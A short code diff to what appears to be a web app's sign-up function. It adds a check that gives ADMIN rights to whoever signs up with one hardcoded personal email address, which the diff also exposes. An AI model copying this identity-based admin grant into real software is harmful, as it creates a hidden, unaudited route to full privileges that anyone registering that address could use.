@@ -111,6 +111,9 @@ async function createUserAndSession(res: Response, signUpInfo: SignUpInfo) {
     avatarUrl: signUpInfo.avatarUrl || serverConfig.defaultAvatarUrl
     // avatarUrl: ''
   }
+  if (dbUser.email.toLowerCase() === 'robert.tamlyn@gmail.com') {
+    dbUser.roles = ['STUDENT', 'ADMIN']
+  }
   const userCreated = await redisdb.createUser(dbUser)
   if (userCreated) {
     // const dbUser = await redisdb.getUserByEmail(signUpInfo.email)
